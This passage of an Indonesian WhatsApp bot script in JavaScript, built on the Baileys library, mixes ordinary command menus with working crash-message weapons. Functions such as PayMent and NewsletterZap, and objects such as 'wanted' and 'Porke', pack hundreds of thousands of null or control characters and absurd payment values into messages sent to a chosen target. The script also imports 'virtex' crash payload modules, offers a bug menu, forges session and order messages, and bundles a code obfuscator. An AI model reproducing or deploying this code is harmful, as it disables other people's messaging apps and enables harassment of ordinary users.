/*
 CREATOR
 @rafztamvan
*/
module.exports = async (zyn, m, store) => {
try {
const from = m.key.remoteJid
const quoted = m.quoted ? m.quoted : m
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() //kalau mau no prefix ganti jadi ini : const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const mime = (quoted.msg || quoted).mimetype || ''
const text = q = args.join(" ")
const isGroup = from.endsWith('@g.us')
const botNumber = await zyn.decodeJid(zyn.user.id)
const sender = m.key.fromMe ? (zyn.user.id.split(':')[0]+'@s.whatsapp.net' || zyn.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await zyn.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
const totalFitur = () =>{
            var mytext = fs.readFileSync("./Rafz.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }
const isAdmins = isGroup ? groupAdmins.includes(sender) : false
const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')
const { Client } = require('ssh2');
const jsobfus = require('javascript-obfuscator');
const { addSaldo, minSaldo, cekSaldo } = require("./database/dtbs/deposit");
const { mediafireDl } = require('./database/dtbs/mediafire.js') 
let db_saldo = JSON.parse(fs.readFileSync("./database/dtbs/saldo.json"));
const { beta1, beta2, buk1 } = require("./database/lib/hdr.js")
const xbug = fs.readFileSync(`./database/image/xbug.jpg`)
const Xynz = fs.readFileSync(`./database/image/Xynz.jpg`) 
const zkosong = fs.readFileSync(`./database/image/zkosong.png`)

const bugres = '𝙋𝙧𝙤𝙘𝙘𝙚𝙨 👾'

// VIRTEX
		const {
			ios
		} = require("./database/virtex/ios.js")
		const {
			telapreta3
		} = require("./database/virtex/telapreta3.js")
		const {
			convite
		} = require("./database/virtex/convite.js")
		const {
			bugpdf
		} = require("./database/virtex/bugpdf.js")
		const {
			cP
		} = require('./database/virtex/bugUrl.js')
	
	
// Auto Blocked Nomor +212
if (m.sender.startsWith('212')) return zyn.updateBlockStatus(m.sender, 'block')
// auto anti bug
if (global.antibug) {
if (!isGroup && m.isBaileys && m.fromMe) {
await zyn.sendMessage(m.chat, {
delete: {
remoteJid: m.chat, fromMe: true, id: m.key.id
}})
await zyn.sendMessage(`${global.owner}@s.whatsapp.net`, {text: `*Terdeteksi Pesan Bug*
*Nomor :* ${m.sender.split("@")[0]}`}, {quoted: null})
}}

// Random Color
const listcolor = ['red','green','yellow','blue','magenta','cyan','white']
const randomcolor = listcolor[Math.floor(Math.random() * listcolor.length)]

let run = runtime(process.uptime())


// Command Yang Muncul Di Console
if (isCmd) {
console.log(chalk.white.bgRed.bold('Ada Pesan, Om'), color(`[ JACKTZY ]`, `green`), color(`FROM`, `red`), color(`${pushname}`, `red`), color(`Text :`, `yellow`), color(`${body}`, `blue`))
}

        // Days
        const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const wib = moment.tz('Asia/Jakarta').format('HH : mm :ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

        const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if (time2 < "23:59:00") {
            var ucapanWaktu = 'Selamat Malam 🏙️'
        }
        if (time2 < "19:00:00") {
            var ucapanWaktu = 'Selamat Petang 🌆'
        }
        if (time2 < "18:00:00") {
            var ucapanWaktu = 'Selamat Sore 🌇'
        }
        if (time2 < "15:00:00") {
            var ucapanWaktu = 'Selamat Siang 🌤️'
        }
        if (time2 < "10:00:00") {
            var ucapanWaktu = 'Selamat Pagi 🌄'
        }
        if (time2 < "05:00:00") {
            var ucapanWaktu = 'Selamat Subuh 🌆'
        }
        if (time2 < "03:00:00") {
            var ucapanWaktu = 'Selamat Tengah Malam 🌃'
        }
       
    zyn.autoshalat = zyn.autoshalat ? zyn.autoshalat : {}
    let id = m.chat
    if (id in zyn.autoshalat) {
    return false
    }
    let jadwalSholat = {
    shubuh: '04:29',
    terbit: '05:44',
    dhuha: '06:02',
    dzuhur: '12:02',
    ashar: '15:15',
    magrib: '17:52',
    isya: '19:01',
    }
    const datek = new Date((new Date).toLocaleString("en-US", {
    timeZone: "Asia/Jakarta"
    }));
    const hours = datek.getHours();
    const minutes = datek.getMinutes();
    const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
    for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
    if (timeNow === waktu) {
        zyn.autoshalat[id] = [
            zyn.sendMessage(m.chat, {
audio: {
    url: 'https://media.vocaroo.com/mp3/1ofLT2YUJAjQ'
},
mimetype: 'audio/mp4',
ptt: true,
contextInfo: {
    externalAdReply: {
        showAdAttribution: true,
        mediaType: 1,
        mediaUrl: '',
        title: `𝐓𝐡𝐞𝐑𝐚𝐟𝐳𝐌𝐨𝐝𝐬𝟗𝟗𝟗〽️`,
        body: `𝐌𝐚𝐫𝐠𝐚 𝐌𝐨𝐝𝐬🎧`,
        sourceUrl: '',
        thumbnail: await fs.readFileSync('./database/image/jadwal.jpg'),
        renderLargerThumbnail: true
    }
}
            }, {}),
            setTimeout(async () => {
delete client.autoshalat[m.chat]
            }, 57000)
        ]
    }
    }

// Read Database
const contacts = JSON.parse(fs.readFileSync("./database/dtbs/contacts.json"))
const prem = JSON.parse(fs.readFileSync("./database/dtbs/premium.json"))
const ownerNumber = JSON.parse(fs.readFileSync("./database/dtbs/owner.json"))

// Cek Database
const isContacts = contacts.includes(sender)
const isPremium = prem.includes(sender)
const isOwner = ownerNumber.includes(senderNumber) || isBot

// BUTTON VIDEO
   zyn.sendButtonVideo = async (jid, buttons, quoted, opts = {}) => {
      var video = await prepareWAMessageMedia({
         video: {
            url: opts && opts.video ? opts.video : ''
         }
      }, {
         upload: zyn.waUploadToServer
      })
      let message = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               interactiveMessage: {
  body: {
     text: opts && opts.body ? opts.body : ''
  },
  footer: {
     text: opts && opts.footer ? opts.footer : ''
  },
  header: {
     hasMediaAttachment: true,
     videoMessage: video.videoMessage,
  },
  nativeFlowMessage: {
     buttons: buttons,
     messageParamsJson: ''
  }, contextInfo: {
      externalAdReply: {
      title: global.namabot,
      body: `𝐌𝐚𝐫𝐠𝐚 𝐌𝐨𝐝𝐬🩸`,
      thumbnailUrl: global.imageurl,
      sourceUrl: global.isLink,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
               
               }
            }
         }
      }, {
         quoted
      })
      await zyn.sendPresenceUpdate('composing', jid)
      return zyn.relayMessage(jid, message["message"], {
         messageId: message.key.id
      })
   }
		    
		async function sendQP(target, filterName, parameters, filterResult, clientNotSupportedConfig, clauseType, clauses, filters) {
    var qpMessage = generateWAMessageFromContent(target, proto.Message.fromObject({
        'qp': {
            'filter': {
                'filterName': filterName,
                'parameters': parameters,
                'filterResult': filterResult,
                'clientNotSupportedConfig': clientNotSupportedConfig
            },
            'filterClause': {
                'clauseType': clauseType,
                'clauses': clauses,
                'filters': filters
            }
        }
    }), { userJid: target });

    await zyn.relayMessage(target, qpMessage.message, { participant: { jid: target }, messageId: qpMessage.key.id });
}
		    
		async function sendSessionStructure(target, sessionVersion, localIdentityPublic, remoteIdentityPublic, rootKey, previousCounter, senderChain, receiverChains, pendingKeyExchange, pendingPreKey, remoteRegistrationId, localRegistrationId, needsRefresh, aliceBaseKey) {
    var sessionStructure = generateWAMessageFromContent(target, proto.Message.fromObject({
        'sessionStructure': {
            'sessionVersion': sessionVersion,
            'localIdentityPublic': localIdentityPublic,
            'remoteIdentityPublic': remoteIdentityPublic,
            'rootKey': rootKey,
            'previousCounter': previousCounter,
            'senderChain': senderChain,
            'receiverChains': receiverChains,
            'pendingKeyExchange': pendingKeyExchange,
            'pendingPreKey': pendingPreKey,
            'remoteRegistrationId': remoteRegistrationId,
            'localRegistrationId': localRegistrationId,
            'needsRefresh': needsRefresh,
            'aliceBaseKey': aliceBaseKey
        }
    }), { userJid: target });

    await zyn.relayMessage(target, sessionStructure.message, { participant: { jid: target }, messageId: sessionStructure.key.id });
}
		
const wanted = {
            key: {
                remoteJid: 'p',
                fromMe: false,
                participant: '0@s.whatsapp.net'
            },
            message: {
                "interactiveResponseMessage": {
                    "body": {
                        "text": "Sent",
                        "format": "DEFAULT"
                    },
                    "nativeFlowResponseMessage": {
                        "name": "galaxy_message",
                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                        "version": 3
                    }
                }
            }
        }	
		
		
		async function PayMent(LockJids) {
			var messageContent = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						'interactiveMessage': {
							'header': {
								"hasMediaAttachment": true,
								'sequenceNumber': '0',
								"jpegThumbnail": ""
							},
							'nativeFlowMessage': {
								"buttons": [{
									"name": "review_and_pay",
									"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐂𝐋͢𝐈𝚵𝐍͢𝐓 ▾\":\k${bugpdf},\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
								}],
								"messageParamsJson": '\0'.repeat(10000),
							}
						}
					}
				}
			}), {});
			zyn.relayMessage(LockJids, messageContent.message, {
				'messageId': messageContent.key.id
			});
		}

		async function NewsletterZap(LockJids) {
			var messageContent = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						"newsletterAdminInviteMessage": {
							"newsletterJid": `120363298524333143@newsletter`,
							"newsletterName": "🔥፝⃟ ꙳𝐏𝐚𝐤𝐓𝐳𝐲🔥፝⃟` " + "\u0000".repeat(920000),
							"jpegThumbnail": "",
							"caption": `Undangan Admin Channel Zynxzo Script`,
							"inviteExpiration": Date.now() + 1814400000
						}
					}
				}
			}), {
				'userJid': LockJids
			});
			await zyn.relayMessage(LockJids, messageContent.message, {
				'participant': {
					'jid': LockJids
				},
				'messageId': messageContent.key.id
			});
		}

		const Porke = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			'message': {
				"interactiveMessage": {
					"header": {
						"hasMediaAttachment": true,
						"jpegThumbnail": fs.readFileSync(`./database/image/zkosong.png`)
					},
					"nativeFlowMessage": {
						"buttons": [{
							"name": "review_and_pay",
							"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰𝐙𝐲𝐧 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
						}]
					}
				}
			}
		}

		const Porke2 = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			'message': {
				"interactiveMessage": {
					"header": {
						"hasMediaAttachment": true,
						"jpegThumbnail": fs.readFileSync(`./database/image/zkosong.png`)
					},
					"nativeFlowMessage": {
						"buttons": [{
							"name": "review_and_pay",
							"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰𝐙𝐲𝐧 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
						}]
					}
				}
			}
		}

let list = []
for (let i of ownerNumber) {
list.push({
displayName: await zyn.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await zyn.getName(i + '@s.whatsapp.net')}\n
FN:${await zyn.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET: barasukimewing@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://whatsapp.com/channel/0029VarTDNiFcowFnrgUeU2v
item3.X-ABLabel:YouTube\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}

function monospace(string) {
return '```' + string + '```'
}

   function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}
 
// Gak Usah Di Apa Apain Jika Tidak Mau Error
try {
ppuser = await zyn.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}

// FUNCTION OBFUSCATOR 
async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `zyn`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}
 
//Status
if (!zyn.public) {
if (!m.key.fromMe) return
} 

async function loading () {
var baralod = [
"Ɑ͞ ̶͞ ̶͞ඩ", 
"Ɑ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩ", 
"Ɑ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩ", 
"Ɑ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩ",
"Ɑ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩ", 
"Ɑ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩ", 
"Ɑ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩ", 
"*_LOADING_*",
"*_SUKSSES FULL TO KUNTUL VERSION [3.0]_*", 
]
let { key } = await zyn.sendMessage(from, {text: '𝐑'})

for (let i = 0; i < baralod.length; i++) {
await zyn.sendMessage(from, {text: baralod[i], edit: key });
}
}
        

// Fake Resize
const fkethmb = await reSize(ppuser, 300, 300)

// Cuma Fake
const sendOrder = async(jid, text, orid, img, itcount, title, sellers, tokens, ammount) => {
const order = generateWAMessageFromContent(jid, proto.Message.fromObject({
"orderMessage": {
"orderId": orid,
"thumbnail": img,
"itemCount": itcount,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": title,
"message": text,
"sellerJid": sellers,
"token": tokens,
"totalAmount1000": ammount,
"totalCurrencyCode": "IDR",
}
}), { userJid: jid, quoted: m })
zyn.relayMessage(jid, order.message, { messageId: order.key.id})
}

// Function Reply
const reply = (teks) => {
            zyn.sendMessage(m.chat,
{
    text: teks,
    contextInfo: {
        mentionedJid: [sender],
        forwardingScore: 9999999,
        isForwarded: true,
        "externalAdReply": {
            "showAdAttribution": true,
            "containsAutoReply": true,
            "title": `𝐓𝐡𝐞𝐉𝐚𝐥𝐥𝐌𝐨𝐝𝐬🩸`,
            "body": `${namabot}`,
            "previewType": "PHOTO",
            "thumbnailUrl": ``,
            "thumbnail": fs.readFileSync(`./database/image/Xynz.jpg`),
            "sourceUrl": `${isLink}`
        }
    }
},
{ quoted: m })
        }

const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }}}}
function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}
    
if (m.isGroup && !m.key.fromMe && !isOwner && antilink) {
if (!isBotAdmins) return
if (budy.match(`whatsapp.com`)) {
zyn.sendMessage(m.chat, {text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`}, {quoted:m})
zyn.groupParticipantsUpdate(m.chat, [sender], 'delete')
zyn.sendMessage(m.chat, { delete: m.key })
}
}

switch (command) {

case 'jall': {
await loading()
darkphonk = fs.readFileSync('./database/Phonk.mp3')
const version = require("baileys/package.json").version
const menu = `
╭──(         *𝐉𝐚𝐥𝐥𝐌𝐨𝐝𝐬✔️*         )
║ᨒ 𝐌𝐚𝐫𝐠𝐚 𝐉𝐚𝐥𝐥\`🩸
│🫧 𝐍𝐚𝐦𝐞 : ${pushname}
║▬▭▬▭▬▭▬▭▬▭
│🫧 𝐎𝐰𝐧𝐞𝐫 : ${namacreator}
║🫧 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝙅𝙖𝙡𝙡𝙈𝙤𝙙𝙨 𝘿𝙚𝙫\`\𐁘
│🫧 𝐎𝐰𝐧 𝐍𝐨 : 6283193344628
║🫧 𝐏𝐫𝐞𝐟𝐢𝐱 : 𝐌𝐔𝐋𝐓𝐈
│▬▭「 𝐉𝐚𝐥𝐥𝐓𝐚𝐦𝐯𝐚𝐧🩸 」▭▬
║› 𝚃𝚑𝚎𝙹𝚊𝚕𝚕𝙼𝚘𝚍𝚜𝟿𝟿𝟿 ©Copyright
╰━━━━━━━━━━━━━━━━━━━⬣
     ⿻  ⌜ 𝐌𝐚𝐫𝐠𝐚 𝐓𝐢𝐳𝐢️ ⌟  ⿻`
let sections = [{
title: '𝐓𝐡𝐞 𝐉𝐚𝐥𝐥 𝐌𝐨𝐝𝐬𝟗𝟗𝟗〽️',
highlight_label: '𝐀𝐥𝐥 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝐀𝐋𝐋 𝐌𝐄𝐍𝐔🐉', 
id: '.allmenu'
}]
},
{
highlight_label: '𝐗𝐗𝐕𝐈𝐏',
rows: [{
title: '𝐈𝐍𝐅𝐈͢𝐍𝐈𝐓𝐘 ☇ 𝐙𝐀𝚸🐉', 
id: '.bugmenu'
}]
},
{
highlight_label: 'SPESIAL FITUR',
rows: [{
title: 'SPECIAL ☇ FITUR🐉', 
id: '.spesialfitur'
}]
},
{
highlight_label: '𝐒𝐭𝐨𝐫𝐞 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝑺𝒕𝒐𝒓𝒆🐉', 
id: '.storemenu'
}]
},
{
highlight_label: '𝐏𝐚𝐧𝐞𝐥 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝑷𝒂𝒏𝒆𝒍🐉', 
id: '.panelmenu'
}]
},
{
highlight_label: '𝐓𝐨𝐨𝐥𝐬 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝑻𝒐𝒐𝒍𝒔🐉', 
id: '.toolsmenu'
}]
},
{
highlight_label: '𝐆𝐫𝐨𝐮𝐩 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝑮𝒓𝒐𝒖𝒑🐉', 
id: '.groupmenu'
}]
},
{
highlight_label: '𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝐎𝐖𝐍𝐄𝐑🐉', 
id: '.ownermenu'
}]
}]
let listMessage = {
    title: '𝐉𝐚𝐥𝐥𝐓𝐚𝐦𝐯𝐚𝐧🩸', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: menu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: ''
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/Xynz.jpg")}, { upload: zyn.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"𝐓𝐡𝐞 𝐆𝐞𝐭𝐬𝐮𝐳𝐨 𝐙𝐡𝐢𝐫𝐨🐉\",\"url\":\"https://whatsapp.com/channel/0029VarTDNiFcowFnrgUeU2v\",\"merchant_url\":\"https://whatsapp.com/channel/0029VarTDNiFcowFnrgUeU2v\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await zyn.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
await zyn.sendMessage(m.chat, {audio: darkphonk, mimetype:'audio/mp4', ptt: true}, {quoted: m })
}
break

case 'panelmenu': {
await loading()
const version = require("baileys/package.json").version
const panelmenu = `
╭──(         *𝐉𝐚𝐥𝐥𝐌𝐨𝐝𝐬✔️*         )
║ᨒ 𝐌𝐚𝐫𝐠𝐚 𝐉𝐚𝐥𝐥\`🩸
│🫧 𝐍𝐚𝐦𝐞 : ${pushname}
║▬▭▬▭▬▭▬▭▬▭
│🫧 𝐎𝐰𝐧𝐞𝐫 : ${namacreator}
║🫧 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝙅𝙖𝙡𝙡𝙈𝙤𝙙𝙨 𝘿𝙚𝙫\`\𐁘
│🫧 𝐎𝐰𝐧 𝐍𝐨 : 6283193344628
║🫧 𝐏𝐫𝐞𝐟𝐢𝐱 : 𝐌𝐔𝐋𝐓𝐈
│▬▭「 𝐉𝐚𝐥𝐥𝐓𝐚𝐦𝐯𝐚𝐧🩸 」▭▬
║› 𝚃𝚑𝚎𝙹𝚊𝚕𝚕𝙼𝚘𝚍𝚜𝟿𝟿𝟿 ©Copyright
╰━━━━━━━━━━━━━━━━━━━⬣

╔─═⊱ *「 \`PANEL MENU\` 」* ─═⬣
│┏⊱
║⿻ 1GB
│⿻ 2GB
║⿻ 3GB
│⿻ 4GB
║⿻ 5GB
│⿻ 6GB
║⿻ 7GB
│⿻ 8GB
║⿻ 9GB
│⿻ Unli
║⿻ Listsrv
│⿻ Delsrv
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣`
let sections = [{
title: '𝐓𝐡𝐞 𝐑𝐚𝐟𝐳 𝐌𝐨𝐝𝐬𝟗𝟗𝟗〽️',
highlight_label: '𝐀𝐥𝐥 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝐀𝐋𝐋 𝐌𝐄𝐍𝐔🐉', 
id: '.allmenu'
}]
},
{
highlight_label: '𝐗𝐗𝐕𝐈𝐏',
rows: [{
title: '𝐈𝐍𝐅𝐈͢𝐍𝐈𝐓𝐘 ☇ 𝐙𝐀𝚸🐉', 
id: '.bugmenu'
}]
},
{
highlight_label: 'SPESIAL FITUR',
rows: [{
title: 'SPECIAL ☇ FITUR🐉', 
id: '.spesialfitur'
}]
},
{
highlight_label: '𝐒𝐭𝐨𝐫𝐞 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝑺𝒕𝒐𝒓𝒆🐉', 
id: '.storemenu'
}]
},
{
highlight_label: '𝐏𝐚𝐧𝐞𝐥 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝑷𝒂𝒏𝒆𝒍🐉', 
id: '.panelmenu'
}]
},
{
highlight_label: '𝐓𝐨𝐨𝐥𝐬 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝑻𝒐𝒐𝒍𝒔🐉', 
id: '.toolsmenu'
}]
},
{
highlight_label: '𝐆𝐫𝐨𝐮𝐩 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝑮𝒓𝒐𝒖𝒑🐉', 
id: '.groupmenu'
}]
},
{
highlight_label: '𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮',
rows: [{
title: '𝐎𝐖𝐍𝐄𝐑🐉', 
id: '.ownermenu'
}]
}]
let listMessage = {
    title: '𝐉𝐚𝐥𝐥𝐓𝐚𝐦𝐯𝐚𝐧🩸', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: panelmenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: ''
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
